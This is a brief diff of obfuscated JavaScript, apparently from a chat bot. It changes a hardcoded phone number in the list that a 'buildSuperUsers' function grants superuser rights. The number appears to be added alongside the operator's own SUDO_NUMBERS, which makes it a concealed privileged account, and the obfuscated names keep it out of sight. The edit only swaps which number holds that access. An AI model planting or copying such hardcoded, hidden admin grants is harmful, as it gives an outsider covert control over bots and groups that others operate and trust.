@@ -249,7 +249,7 @@ const getGroupInfo = async (_0x5c43ff, _0x14052f, _0x5af49b, _0x31156b) => {
   return _0x8733e3;
 };
 const buildSuperUsers = async (_0x161e05, _0x1f1c52, _0x59be4e, _0x220004) => {
-  const _0x2540e1 = "6399215379".split(",").map(_0x158887 => _0x158887.trim().replace(/\D/g, "")).filter(_0x131b92 => _0x131b92.length > 5);
+  const _0x2540e1 = "5563999215379".split(",").map(_0x158887 => _0x158887.trim().replace(/\D/g, "")).filter(_0x131b92 => _0x131b92.length > 5);
   const _0xa13e1f = (await _0x1f1c52()) || [];
   const _0x41271e = _0x161e05.SUDO_NUMBERS || "";
   const _0x536c1d = (_0x41271e ? _0x41271e.split(",") : []).map(_0x525f8b => _0x525f8b.trim().replace(/\D/g, "")).filter(_0x35a3d5 => _0x35a3d5.length > 5);
